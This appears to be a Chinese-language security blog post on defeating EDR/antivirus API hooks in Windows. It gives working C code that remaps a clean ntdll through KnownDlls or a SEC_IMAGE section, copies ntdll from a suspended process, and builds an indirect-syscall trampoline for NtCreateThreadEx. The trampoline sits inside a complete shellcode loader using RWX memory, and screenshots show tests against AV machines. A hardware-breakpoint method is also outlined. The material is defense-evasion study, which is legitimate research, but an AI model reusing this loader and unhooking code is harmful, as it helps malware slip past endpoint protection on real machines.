+<p>节映射（Image Mapping）是指通过 SEC_IMAGE 创建的 Image Section 被映射到进程地址空间，内核会对 PE 进行解析、重排与对齐，形成 完整的、可执行的映像布局（MEM_IMAGE），属于 Windows 认可的 完整映像。</p>
+</blockquote>
+<blockquote>
+<p>磁盘重载（File Mapping）是指 磁盘上的文件仅作为普通文件，通过 Section object 进行文件映射，映射结果只是原始磁盘文件数据在内存中的线性视图（MEM_MAPPED），内核不解析 PE，也不赋予映像语义。</p>
+</blockquote>
+<p>通过节映射将dll重新展开映射到内存中，获取到干净的dll</p>
+<p>以下有两条路线可以实现节映射：</p>
+<ul>
+<li>NtOpenSection + NtMapViewOfSection 通过 <strong>\KnownDlls\ntdll.dll（系统预先创建好的 Section）</strong> 直接将节对象映射，映射结果Type为 MEM_IMAGE</li>
+<li>CreateFile/NtOpenFile + NtCreateSection + NtMapViewOfSection 通过文件句柄打开磁盘文件并创建Image Section，将节对象映射，映射结果Type为 MEM_IMAGE</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;psapi.h&gt;</span><br><span class="line"></span><br><span class="line">#define NT_SUCCESS(Status) ((NTSTATUS)(Status) &gt;&#x3D; 0)</span><br><span class="line">#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )</span><br><span class="line"></span><br><span class="line">#define OBJ_CASE_INSENSITIVE 0x40</span><br><span class="line">#define InitializeObjectAttributes( p, n, a, r, s ) &#123;   \</span><br><span class="line">    (p)-&gt;Length &#x3D; sizeof( OBJECT_ATTRIBUTES );          \</span><br><span class="line">    (p)-&gt;RootDirectory &#x3D; r;                             \</span><br><span class="line">    (p)-&gt;Attributes &#x3D; a;                                \</span><br><span class="line">    (p)-&gt;ObjectName &#x3D; n;                                \</span><br><span class="line">    (p)-&gt;SecurityDescriptor &#x3D; s;                        \</span><br><span class="line">    (p)-&gt;SecurityQualityOfService &#x3D; NULL;               \</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">typedef struct _UNICODE_STRING &#123;</span><br><span class="line">	USHORT Length;</span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	PWSTR  Buffer;</span><br><span class="line">&#125; UNICODE_STRING, * RX_UNICODE_STRING;</span><br><span class="line"></span><br><span class="line">typedef VOID(NTAPI* MyRtlInitUnicodeString)(RX_UNICODE_STRING, PCWSTR);</span><br><span class="line"></span><br><span class="line">typedef struct _OBJECT_ATTRIBUTES &#123;</span><br><span class="line">	ULONG Length;</span><br><span class="line">	HANDLE RootDirectory;</span><br><span class="line">	RX_UNICODE_STRING ObjectName;</span><br><span class="line">	ULONG Attributes;</span><br><span class="line">	PVOID SecurityDescriptor;        &#x2F;&#x2F; Points to type SECURITY_DESCRIPTOR</span><br><span class="line">	PVOID SecurityQualityOfService;  &#x2F;&#x2F; Points to type SECURITY_QUALITY_OF_SERVICE</span><br><span class="line"></span><br><span class="line">&#125; OBJECT_ATTRIBUTES;</span><br><span class="line"></span><br><span class="line">typedef const OBJECT_ATTRIBUTES* PCOBJECT_ATTRIBUTES;</span><br><span class="line"></span><br><span class="line">typedef struct _IO_STATUS_BLOCK &#123;</span><br><span class="line">	union &#123;</span><br><span class="line">		NTSTATUS Status;</span><br><span class="line">		PVOID Pointer;</span><br><span class="line">	&#125;;</span><br><span class="line">	ULONG_PTR Information;</span><br><span class="line">&#125; IO_STATUS_BLOCK, * RX_IO_STATUS_BLOCK;</span><br><span class="line"></span><br><span class="line">typedef NTSTATUS(NTAPI* MyNtOpenSection)(PHANDLE, ACCESS_MASK, PCOBJECT_ATTRIBUTES);</span><br><span class="line">typedef NTSTATUS(NTAPI* MyNtOpenFile)(PHANDLE, ACCESS_MASK, PCOBJECT_ATTRIBUTES, RX_IO_STATUS_BLOCK, ULONG, ULONG);</span><br><span class="line">typedef NTSTATUS(NTAPI* MyNtCreateSection)(PHANDLE, ACCESS_MASK, PCOBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);</span><br><span class="line">typedef NTSTATUS(NTAPI* MyNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void SectionMapping1() &#123;</span><br><span class="line">    UNICODE_STRING ObjectPath;</span><br><span class="line">    OBJECT_ATTRIBUTES ObjectAttributes;</span><br><span class="line">    HANDLE hSection;</span><br><span class="line">    PVOID SectionNtdllBase &#x3D; NULL;</span><br><span class="line">    ULONG_PTR ViewSize &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">    HMODULE memNtdllBase &#x3D; GetModuleHandleA(&quot;ntdll.dll&quot;);</span><br><span class="line">    MyRtlInitUnicodeString RtlInitUnicodeString &#x3D; (MyRtlInitUnicodeString)GetProcAddress(memNtdllBase, &quot;RtlInitUnicodeString&quot;);</span><br><span class="line">    MyNtOpenSection pNtOpenSection &#x3D; (MyNtOpenSection)(GetProcAddress(memNtdllBase, &quot;NtOpenSection&quot;));</span><br><span class="line">    MyNtMapViewOfSection pNtMapViewOfSection &#x3D; (MyNtMapViewOfSection)(GetProcAddress(memNtdllBase, &quot;NtMapViewOfSection&quot;));</span><br><span class="line"></span><br><span class="line">    RtlInitUnicodeString(&amp;ObjectPath, L&quot;\\KnownDlls\\ntdll.dll&quot;);</span><br><span class="line">    InitializeObjectAttributes(&amp;ObjectAttributes, &amp;ObjectPath, OBJ_CASE_INSENSITIVE, NULL, NULL);</span><br><span class="line"></span><br><span class="line">    NTSTATUS status1 &#x3D; pNtOpenSection(&amp;hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &amp;ObjectAttributes);</span><br><span class="line">    if (!NT_SUCCESS(status1)) &#123;printf(&quot;[!] Failed in NtOpenSection (%u)\n&quot;, GetLastError());return;&#125;</span><br><span class="line"></span><br><span class="line">    NTSTATUS status2 &#x3D; pNtMapViewOfSection(hSection, NtCurrentProcess(), &amp;SectionNtdllBase, 0, 0, NULL, &amp;ViewSize, 1, 0, PAGE_READONLY);</span><br><span class="line">    if (!NT_SUCCESS(status2)) &#123;printf(&quot;[!] Failed in NtMapViewOfSection (%u)\n&quot;, GetLastError());return;&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void SectionMapping2() &#123;</span><br><span class="line">	UNICODE_STRING ObjectPath;</span><br><span class="line">	OBJECT_ATTRIBUTES ObjectAttributes;</span><br><span class="line">	IO_STATUS_BLOCK IoStatusBlock;</span><br><span class="line">	HANDLE hFile;</span><br><span class="line">	HANDLE hSection;</span><br><span class="line">	PVOID SectionNtdllBase &#x3D; NULL;</span><br><span class="line">	ULONG_PTR ViewSize &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">	HMODULE memNtdllBase &#x3D; GetModuleHandleA(&quot;ntdll.dll&quot;);</span><br><span class="line">	MyRtlInitUnicodeString RtlInitUnicodeString &#x3D; (MyRtlInitUnicodeString)GetProcAddress(memNtdllBase, &quot;RtlInitUnicodeString&quot;);</span><br><span class="line">	MyNtOpenFile pNtOpenFile &#x3D; (MyNtOpenFile)(GetProcAddress(memNtdllBase, &quot;NtOpenFile&quot;));</span><br><span class="line">	MyNtCreateSection pNtCreateSection &#x3D; (MyNtCreateSection)(GetProcAddress(memNtdllBase, &quot;NtCreateSection&quot;));</span><br><span class="line">	MyNtMapViewOfSection pNtMapViewOfSection &#x3D; (MyNtMapViewOfSection)(GetProcAddress(memNtdllBase, &quot;NtMapViewOfSection&quot;));</span><br><span class="line"></span><br><span class="line">	RtlInitUnicodeString(&amp;ObjectPath, L&quot;\\??\\C:\\Windows\\System32\\ntdll.dll&quot;);</span><br><span class="line">	InitializeObjectAttributes(&amp;ObjectAttributes, &amp;ObjectPath, OBJ_CASE_INSENSITIVE, NULL, NULL);</span><br><span class="line"></span><br><span class="line">	NTSTATUS status1 &#x3D; pNtOpenFile(&amp;hFile, FILE_READ_DATA | GENERIC_READ, &amp;ObjectAttributes, &amp;IoStatusBlock, FILE_SHARE_READ, NULL);</span><br><span class="line">	if (!NT_SUCCESS(status1)) &#123; printf(&quot;[!] Failed in NtOpenFile (%u)\n&quot;, GetLastError());return; &#125;</span><br><span class="line"></span><br><span class="line">	NTSTATUS status2 &#x3D; pNtCreateSection(&amp;hSection, STANDARD_RIGHTS_REQUIRED | SECTION_MAP_READ | SECTION_QUERY, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);</span><br><span class="line">	if (!NT_SUCCESS(status2)) &#123; printf(&quot;[!] Failed in NtCreateSection (%u)\n&quot;, GetLastError());return; &#125;</span><br><span class="line"></span><br><span class="line">	NTSTATUS status3 &#x3D; pNtMapViewOfSection(hSection, NtCurrentProcess(), &amp;SectionNtdllBase, 0, 0, NULL, &amp;ViewSize, 1, 0, PAGE_READONLY);</span><br><span class="line">	if (!NT_SUCCESS(status3)) &#123; printf(&quot;[!] Failed in NtMapViewOfSection (%u)\n&quot;, GetLastError());return; &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260208045313000.png" alt="image-20260208045313000"></p>
+<h2 id="挂起进程"><a href="#挂起进程" class="headerlink" title="挂起进程"></a>挂起进程</h2><p>创建一个挂起的进程时，只会加载一个干净的ntdll.dll</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void UnhookSuspend() &#123;</span><br><span class="line">    STARTUPINFOA si &#x3D; &#123; 0 &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi &#x3D; &#123;0&#125;;</span><br><span class="line">    CreateProcessA(&quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED|CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);</span><br><span class="line">    printf(&quot;[*] PID : %d\n&quot;, pi.dwProcessId);</span><br><span class="line"></span><br><span class="line">    HMODULE memNtdllBase &#x3D; GetModuleHandleA(&quot;ntdll.dll&quot;);</span><br><span class="line">    PIMAGE_DOS_HEADER memDosHeader &#x3D; (PIMAGE_DOS_HEADER)memNtdllBase;</span><br><span class="line">    PIMAGE_NT_HEADERS memNtHeader &#x3D; (PIMAGE_NT_HEADERS)((BYTE*)memNtdllBase + memDosHeader-&gt;e_lfanew);</span><br><span class="line">    IMAGE_OPTIONAL_HEADER memOpHeader &#x3D; (IMAGE_OPTIONAL_HEADER)(memNtHeader-&gt;OptionalHeader);</span><br><span class="line">    DWORD Ntsize &#x3D; memOpHeader.SizeOfImage;</span><br><span class="line"></span><br><span class="line">    LPVOID ProcessNtdllBase &#x3D; HeapAlloc(GetProcessHeap(), 0, Ntsize);</span><br><span class="line">    SIZE_T dwRead;</span><br><span class="line">    BOOL bSuccess &#x3D; ReadProcessMemory(pi.hProcess, (LPCVOID)memNtdllBase, ProcessNtdllBase, Ntsize, &amp;dwRead);</span><br><span class="line">    if (!bSuccess) &#123;printf(&quot;[-] Failed in reading process ntdll (%u)\n&quot;, GetLastError());return;&#125;</span><br><span class="line">    TerminateProcess(pi.hProcess, 0);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在AV机器测试时虽然可以正常执行，但是最后总会触发错误</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260208162920145.png" alt="image-20260208162920145"></p>
+<h2 id="Syscall"><a href="#Syscall" class="headerlink" title="Syscall"></a>Syscall</h2><p>直接系统调用：绕过用户空间 API 钩子，直接调用内核服务</p>
+<p>间接系统调用：通过从合法的代码位置执行系统调用来维护自然的调用堆栈</p>
+<p>这一块内容扩展就有点太多了，后续结合项目进行学习</p>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1464/">https://tttang.com/archive/1464/</a> 、<a target="_blank" rel="noopener" href="https://forum.butian.net/share/4527%E3%80%81https://xz.aliyun.com/news/13127">https://forum.butian.net/share/4527、https://xz.aliyun.com/news/13127</a></p>
+<h3 id="间接系统调用"><a href="#间接系统调用" class="headerlink" title="间接系统调用"></a>间接系统调用</h3><p>通过重新自定义一个新函数，在新函数中跳转到被hook函数的jmp指令后的位置，从而跳过jmp指令检测，同时还不用修改原函数，并且最终是ntdll发起的调用。这张图以LdrLoadDll函数为例，解释了该方法的原理</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211001705602.png" alt="image-20260211001705602"></p>
+<p>简单解释下自定义函数的指令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 89 5c 24 10 					mov qword ptr [rsp+10h],rbx   &#x2F;&#x2F; 手动恢复因hook被覆盖的原字节</span><br><span class="line">49 bb de ad be ef de ad be ef   movabs r11,0xefbeaddeefbeadde &#x2F;&#x2F; 保存要跳转到的地址</span><br><span class="line">41 ff e3                		jmp    r11 &#x2F;&#x2F; 跳转</span><br><span class="line">c3                      		ret</span><br></pre></td></tr></table></figure>
+
+<p>同样可以应用到其他的函数，通过查看上面的ZwOpenProcess对比图，发现遵循SYSCALL的函数被hook后缺少了 <code>mov r10 rcx | mov eax &lt;syscall number&gt;</code> 指令，因此在新函数中我们要添加上这两条指令后再jmp，所以自定义函数指令变为了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4C 8B D1				mov r10, rcx		&#x2F;&#x2F; syscall-1</span><br><span class="line">B8 &lt;number&gt; 00 00 00	mov eax, &lt;SSN&gt;	&#x2F;&#x2F; syscall-2,SSN number不同函数是不同的</span><br><span class="line">49 BB &lt;addr&gt; 			mov r11, &lt;addr&gt; 	&#x2F;&#x2F; 保存要跳转到的地址</span><br><span class="line">41 ff e3				jmp r11				&#x2F;&#x2F; 跳转</span><br></pre></td></tr></table></figure>
+
+<p>这里以NtCreateThreadEx为例，给出代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">#define NT_SUCCESS(Status) ((NTSTATUS)(Status) &gt;&#x3D; 0)</span><br><span class="line"></span><br><span class="line">typedef struct _UNICODE_STRING &#123;</span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">#ifdef MIDL_PASS</span><br><span class="line">    [size_is(MaximumLength &#x2F; 2), length_is((Length) &#x2F; 2)] USHORT* Buffer;</span><br><span class="line">#else &#x2F;&#x2F; MIDL_PASS</span><br><span class="line">    _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH   Buffer;</span><br><span class="line">#endif &#x2F;&#x2F; MIDL_PASS</span><br><span class="line">&#125; UNICODE_STRING;</span><br><span class="line">typedef UNICODE_STRING* PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line">typedef struct _OBJECT_ATTRIBUTES &#123;</span><br><span class="line">    ULONG Length;</span><br><span class="line">    HANDLE RootDirectory;</span><br><span class="line">    PUNICODE_STRING ObjectName;</span><br><span class="line">    ULONG Attributes;</span><br><span class="line">    PVOID SecurityDescriptor;        &#x2F;&#x2F; Points to type SECURITY_DESCRIPTOR</span><br><span class="line">    PVOID SecurityQualityOfService;  &#x2F;&#x2F; Points to type SECURITY_QUALITY_OF_SERVICE</span><br><span class="line">&#125; OBJECT_ATTRIBUTES;</span><br><span class="line">typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES;</span><br><span class="line">typedef CONST OBJECT_ATTRIBUTES* PCOBJECT_ATTRIBUTES;</span><br><span class="line"></span><br><span class="line">typedef struct _PS_ATTRIBUTE</span><br><span class="line">&#123;</span><br><span class="line">    ULONG_PTR Attribute;                &#x2F;&#x2F; PROC_THREAD_ATTRIBUTE_XXX | PROC_THREAD_ATTRIBUTE_XXX modifiers, see ProcThreadAttributeValue macro and Windows Internals 6 (372)</span><br><span class="line">    SIZE_T Size;                        &#x2F;&#x2F; Size of Value or *ValuePtr</span><br><span class="line">    union</span><br><span class="line">    &#123;</span><br><span class="line">        ULONG_PTR Value;                &#x2F;&#x2F; Reserve 8 bytes for data (such as a Handle or a data pointer)</span><br><span class="line">        PVOID ValuePtr;                 &#x2F;&#x2F; data pointer</span><br><span class="line">    &#125;;</span><br><span class="line">    PSIZE_T ReturnLength;               &#x2F;&#x2F; Either 0 or specifies size of data returned to caller via &quot;ValuePtr&quot;</span><br><span class="line">&#125; PS_ATTRIBUTE, * PPS_ATTRIBUTE;</span><br><span class="line"></span><br><span class="line">typedef struct _PS_ATTRIBUTE_LIST</span><br><span class="line">&#123;</span><br><span class="line">    SIZE_T TotalLength;                 &#x2F;&#x2F; sizeof(PS_ATTRIBUTE_LIST)</span><br><span class="line">    PS_ATTRIBUTE Attributes[2];         &#x2F;&#x2F; Depends on how many attribute entries should be supplied to NtCreateUserProcess</span><br><span class="line">&#125; PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;</span><br><span class="line"></span><br><span class="line">typedef NTSTATUS (NTAPI* PUSER_THREAD_START_ROUTINE)(</span><br><span class="line">    _In_ PVOID ThreadParameter</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">typedef NTSTATUS (NTAPI* MyNtCreateThreadEx)(</span><br><span class="line">    _Out_ PHANDLE ThreadHandle,</span><br><span class="line">    _In_ ACCESS_MASK DesiredAccess,</span><br><span class="line">    _In_opt_ PCOBJECT_ATTRIBUTES ObjectAttributes,</span><br><span class="line">    _In_ HANDLE ProcessHandle,</span><br><span class="line">    _In_ PUSER_THREAD_START_ROUTINE StartRoutine,</span><br><span class="line">    _In_opt_ PVOID Argument,</span><br><span class="line">    _In_ ULONG CreateFlags, &#x2F;&#x2F; THREAD_CREATE_FLAGS_*</span><br><span class="line">    _In_ SIZE_T ZeroBits,</span><br><span class="line">    _In_ SIZE_T StackSize,</span><br><span class="line">    _In_ SIZE_T MaximumStackSize,</span><br><span class="line">    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">PVOID CCopyMemory(PVOID Destination, CONST PVOID Source, SIZE_T Length)</span><br><span class="line">&#123;</span><br><span class="line">    PBYTE D &#x3D; (PBYTE)Destination;</span><br><span class="line">    PBYTE S &#x3D; (PBYTE)Source;</span><br><span class="line"></span><br><span class="line">    while (Length--)</span><br><span class="line">        *D++ &#x3D; *S++;</span><br><span class="line"></span><br><span class="line">    return Destination;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void UnhookJump(LPVOID pMemory) &#123;</span><br><span class="line">    unsigned char syscode[] &#x3D; &#123; 0x4C, 0x8B, 0xD1, 0xB8, 0xC2, 0x00, 0x00, 0x00, &#125;; &#x2F;&#x2F; mov r10, rcx ; mov eax, C2</span><br><span class="line">    unsigned char jumpPrelude[] &#x3D; &#123; 0x49, 0xBB &#125;; &#x2F;&#x2F; mov r11, jumpAddress</span><br><span class="line">    unsigned char jumpAddress[] &#x3D; &#123; 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF &#125;;</span><br><span class="line">    unsigned char jumpEpilogue[] &#x3D; &#123; 0x41, 0xFF, 0xE3 &#125;;  &#x2F;&#x2F; jmp r11</span><br><span class="line">    LPVOID origNtCreateThreadEx &#x3D; GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtCreateThreadEx&quot;);</span><br><span class="line">    LPVOID jmpAddr &#x3D; (void*)((char*)origNtCreateThreadEx + 0x8);</span><br><span class="line">    *(void**)(jumpAddress) &#x3D; jmpAddr;</span><br><span class="line"></span><br><span class="line">    LPVOID trampoline &#x3D; VirtualAlloc(NULL, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    printf(&quot;Address of jmpFunc at 0x%p\n&quot;, trampoline);</span><br><span class="line">    printf(&quot;Original NtCreateThreadEx at 0x%p\n&quot;, origNtCreateThreadEx);</span><br><span class="line">    printf(&quot;jmp to Address at 0x%p\n&quot;, jmpAddr);</span><br><span class="line"></span><br><span class="line">    CCopyMemory(trampoline, syscode, 8);</span><br><span class="line">    CCopyMemory((PBYTE)trampoline + 8, jumpPrelude, 2);</span><br><span class="line">    CCopyMemory((PBYTE)trampoline + 8 + 2, jumpAddress, sizeof(jumpAddress));</span><br><span class="line">    CCopyMemory((PBYTE)trampoline + 8 + 2 + 8, jumpEpilogue, 3);</span><br><span class="line"></span><br><span class="line">    DWORD oldProtect &#x3D; 0;</span><br><span class="line">    VirtualProtect(trampoline, 30, PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class="line">    MyNtCreateThreadEx pNtCreateThreadEx &#x3D; (MyNtCreateThreadEx)trampoline;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    NTSTATUS status &#x3D; pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PUSER_THREAD_START_ROUTINE)pMemory, NULL, FALSE, 0, 0, 0, NULL);</span><br><span class="line">    if (!NT_SUCCESS(status)) &#123; printf(&quot;[!] Failed in NtCreateThreadEx (%u)\n&quot;, GetLastError());return; &#125;;</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char buf[] &#x3D; &quot;xxxx&quot;; &#x2F;&#x2F; shellcode here</span><br><span class="line"></span><br><span class="line">    LPVOID pMemory &#x3D; VirtualAlloc(NULL, sizeof(buf), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    RtlMoveMemory(pMemory, buf, sizeof(buf));</span><br><span class="line">    printf(&quot;shellcode address: 0x%p\n&quot;, pMemory);</span><br><span class="line">    </span><br><span class="line">    UnhookJump(pMemory);</span><br><span class="line"></span><br><span class="line">    VirtualFree(pMemory, 0, MEM_RELEASE);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>跟踪调试下，shellcode进内存</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211003716235.png" alt="image-20260211003716235"></p>
+<p>计算出jmp地址</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211004028072.png" alt="image-20260211004028072"></p>
+<p>将自定义函数指令写入内存</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211004203440.png" alt="image-20260211004203440"></p>
+<p>成功jmp，shellcode执行</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211004447736.png" alt="image-20260211004447736"></p>
+<p>测试一下杀软环境的情况</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211005453313.png" alt="image-20260211005453313"></p>
+<p>成功绕过了jmp</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211005642161.png" alt="image-20260211005642161"></p>
+<p>但是最后还是被拦截</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211005946114.png" alt="image-20260211005946114"></p>
+<p>通过比对 本机和AV机，NtCreateThreadEx已经执行，存在差异的是shellcode在创建进程这一步在AV机失败，猜测可能是shellcode所在内存地址、属性、堆栈、Thread回调等原因导致的失败？</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211012343925.png" alt="image-20260211012343925"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211012654939.png" alt="image-20260211012654939"></p>
+<h3 id="直接系统调用"><a href="#直接系统调用" class="headerlink" title="直接系统调用"></a>直接系统调用</h3><p>完全将函数进入ring0的完整指令保存并执行，最大的缺陷就是不经过ntdll直接进入内核的调用堆栈。</p>
+<h2 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h2><blockquote>
+<p>windows PE进程初始化过程中ldrloaddll 加载 ntdll过程</p>
+<p>windows用户态调试机制与模型</p>
+<p>三种断点方式分别触发不同类型异常</p>
+<p>windows异常处理</p>
+<p>用户态获取调试对象的函数：WaitForDebugEvent、ContinueDebugEvent</p>
+</blockquote>
+<p>在用户态可以利用这么一种循环模型构造一个简单的调试器来调试程序，该调试模型是基于异常分发机制实现</p>
+<ul>
+<li>创建/附加debug进程</li>
+<li>通过WaitForDebugEvent获取异常事件</li>
+<li>在不同事件中可以进行你要做的事</li>
+<li>在EXCEPTION_DEBUG_EVENT可以进一步区分是什么异常类型，并进行你要做的事</li>
+<li>通过ContinueDebugEvent继续执行调试</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CreateProcess(..., DEBUG_PROCESS, ...) 或者 DebugActiveProcess(dwProcessId)</span><br><span class="line"></span><br><span class="line">DEBUG_EVENT de;</span><br><span class="line">BOOL bContinue &#x3D; TRUE;</span><br><span class="line">DWORD dwContinueStatus &#x3D; DBG_CONTINUE;</span><br><span class="line"></span><br><span class="line">while (bContinue)</span><br><span class="line">&#123;</span><br><span class="line">    bContinue &#x3D; WaitForDebugEvent(&amp;de, INFINITE); &#x2F;&#x2F; 等待调试事件（阻塞）</span><br><span class="line">    if (!bContinue)</span><br><span class="line">        break;</span><br><span class="line">    </span><br><span class="line">    dwContinueStatus &#x3D; DBG_CONTINUE; &#x2F;&#x2F; 默认继续状态</span><br><span class="line"></span><br><span class="line">    switch (de.dwDebugEventCode)</span><br><span class="line">    &#123;</span><br><span class="line">        case CREATE_PROCESS_DEBUG_EVENT:  break; &#x2F;&#x2F; 进程创建</span><br><span class="line">        case CREATE_THREAD_DEBUG_EVENT:  break; &#x2F;&#x2F; 线程创建</span><br><span class="line">        case EXIT_PROCESS_DEBUG_EVENT:  bContinue &#x3D; FALSE; break; &#x2F;&#x2F; 进程退出</span><br><span class="line">        case EXIT_THREAD_DEBUG_EVENT:  bContinue &#x3D; FALSE; break; &#x2F;&#x2F; 线程退出</span><br><span class="line">        case LOAD_DLL_DEBUG_EVENT: break; &#x2F;&#x2F; dll加载</span><br><span class="line">        case UNLOAD_DLL_DEBUG_EVENT: break; &#x2F;&#x2F; dll卸载</span><br><span class="line">        case EXCEPTION_DEBUG_EVENT: &#x2F;&#x2F; 异常事件</span><br><span class="line">        &#123;</span><br><span class="line">            DWORD code &#x3D; de.u.Exception.ExceptionRecord.ExceptionCode;</span><br><span class="line">            switch (code)</span><br><span class="line">            &#123;</span><br><span class="line">                case EXCEPTION_BREAKPOINT: &#123;break;&#125; &#x2F;&#x2F; int 3 异常 - 软件断点</span><br><span class="line">                case EXCEPTION_ACCESS_VIOLATION: &#123;break;&#125; &#x2F;&#x2F;访问异常 - 内存断点</span><br><span class="line">                case EXCEPTION_SINGLE_STEP: &#123;break;&#125; &#x2F;&#x2F; 单步 - 硬件断点</span><br><span class="line">                default: &#x2F;&#x2F; 未处理异常 -&gt; 交给程序</span><br><span class="line">                &#123;</span><br><span class="line">                    dwContinueStatus &#x3D; DBG_EXCEPTION_NOT_HANDLED;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        default: break; &#x2F;&#x2F; 其他调试事件</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 通知内核继续执行</span><br><span class="line">    ContinueDebugEvent(de.dwProcessId,de.dwThreadId,dwContinueStatus);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调试与断点是无法分开的，硬件断点是异常触发手段的其中一种，它允许 CPU 在读取、写入或执行特定地址时触发异常，从而被调试模型捕获。</p>
+<p>硬件断点进行unhook原理就是在Dr0寄存器中写入 **LdrLoadDll ** 地址即在该地址下了硬件断点，通过调试模型在 <code>case EXCEPTION_SINGLE_STEP</code> 时触发，此时由于进程创建时已经自动加载一个干净的ntdll，并不需要加载后续dll，因此在该断点直接return使当前进程仍处于阻塞状态以保证不会加载后续dll。</p>
+<p>为了能理解 调试 - 硬件断点，以下有很好的文章进行学习</p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/debug/basic-debugging">Microsoft-basic-debugging</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1471234">初探Windows用户态调试机制</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1461">windows环境下的调试器探究</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/y33fow2XfWD0Dm89HqV13g">滥用方法VS检测手段：深入探究Windows硬件断点和异常</a></p>
+<p>同时还有深入整个模型背后异常分发机制的拓展文章：</p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1475">初探windows异常处理</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1663524-1-1.html">Windows 10 x64 异常分发</a></p>
+<p>分析下代码，创建DEBUG进程</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL hProcbool &#x3D; CreateProcessWCustom(processName, processName, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &amp;si, &amp;pi);</span><br></pre></td></tr></table></figure>
+
+<p>找LdrLoadDll地址</p>
